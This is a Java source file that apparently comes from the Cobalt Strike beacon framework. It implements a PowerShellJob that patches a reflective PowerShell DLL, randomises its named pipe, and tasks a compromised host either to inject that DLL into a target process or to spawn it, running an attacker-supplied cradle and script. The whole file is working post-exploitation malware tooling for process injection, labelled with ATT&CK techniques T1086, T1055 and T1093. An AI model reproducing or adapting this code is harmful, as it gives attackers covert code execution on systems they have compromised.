package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import common.ReflectiveDLL;

public class PowerShellJob
        extends Job {
    protected String task;
    protected String cradle;
    protected String desc = "";

    public PowerShellJob(TaskBeacon tasker, String cradle, String task) {
        super(tasker);
        this.cradle = cradle;
        this.task = task;
    }

    @Override
    public String getDescription() {
        return this.desc;
    }

    @Override
    public String getShortDescription() {
        return "PowerShell (Unmanaged)";
    }

    @Override
    public String getDLLName() {
        if ("x64".equals(this.arch)) {
            return "resources/powershell.x64.dll";
        }
        return "resources/powershell.dll";
    }

    @Override
    public String getPipeName() {
        return "powershell";
    }

    @Override
    public String getTactic() {
        return "T1086";
    }

    @Override
    public int getCallbackType() {
        return 32;
    }

    @Override
    public int getWaitTime() {
        return 10000;
    }

    @Override
    public byte[] fix(byte[] mydll) {
        Packer temp = new Packer();
        temp.addStringUTF8(this.cradle + this.task, 8192);
        mydll = CommonUtils.patch(mydll, "POWERSHELL ABCDEFGHIJKLMNOPQRSTUVWXYZ", CommonUtils.bString(temp.getBytes()));
        return mydll;
    }

    @Override
    public void inject(int pid, String arch) {
        throw new RuntimeException("Call inject(bid, pid, arch)");
    }

    public void inject(String bid, int pid, String arch) {
        this.pid = pid;
        this.arch = arch;
        this.desc = "Tasked beacon to psinject: " + this.task + " into " + pid + " (" + arch + ")";
        byte[] mydll = CommonUtils.readResource(this.getDLLName());
        if (arch.equals("x64")) {
            mydll = ReflectiveDLL.patchDOSHeaderX64(mydll, 170532320);
            this.builder.setCommand(66);
        } else {
            mydll = ReflectiveDLL.patchDOSHeader(mydll, 170532320);
            this.builder.setCommand(65);
        }
        String pname = "\\\\.\\pipe\\" + CommonUtils.garbage(this.getPipeName());
        mydll = CommonUtils.strrep(mydll, "\\\\.\\pipe\\" + this.getPipeName(), pname);
        mydll = this.fix(mydll);
        this.builder.addInteger(pid);
        this.builder.addInteger(0);
        this.builder.addString(CommonUtils.bString(mydll));
        byte[] taskA = this.builder.build();
        this.builder.setCommand(this.getJobType());
        this.builder.addInteger(pid);
        this.builder.addShort(this.getCallbackType());
        this.builder.addShort(this.getWaitTime());
        this.builder.addLengthAndString(pname);
        this.builder.addLengthAndString(this.getShortDescription());
        byte[] taskB = this.builder.build();
        this.tasker.task(bid, taskA, taskB, this.getDescription(), this.getTactic() + ", T1055");
    }

    @Override
    public void spawn(String bid, String arch) {
        this.arch = arch;
        this.desc = "Tasked beacon to run: " + this.task + " (unmanaged)";
        byte[] mydll = CommonUtils.readResource(this.getDLLName());
        if (arch.equals("x64")) {
            mydll = ReflectiveDLL.patchDOSHeaderX64(mydll, 1453503984);
            this.builder.setCommand(64);
        } else {
            mydll = ReflectiveDLL.patchDOSHeader(mydll, 1453503984);
            this.builder.setCommand(63);
        }
        String pname = "\\\\.\\pipe\\" + CommonUtils.garbage(this.getPipeName());
        mydll = CommonUtils.strrep(mydll, "\\\\.\\pipe\\" + this.getPipeName(), pname);
        mydll = this.fix(mydll);
        this.builder.addString(CommonUtils.bString(mydll));
        byte[] taskA = this.builder.build();
        this.builder.setCommand(this.getJobType());
        this.builder.addInteger(0);
        this.builder.addShort(this.getCallbackType());
        this.builder.addShort(this.getWaitTime());
        this.builder.addLengthAndString(pname);
        this.builder.addLengthAndString(this.getShortDescription());
        byte[] taskB = this.builder.build();
        this.tasker.task(bid, taskA, taskB, this.getDescription(), this.getTactic() + ", T1093");
    }
}

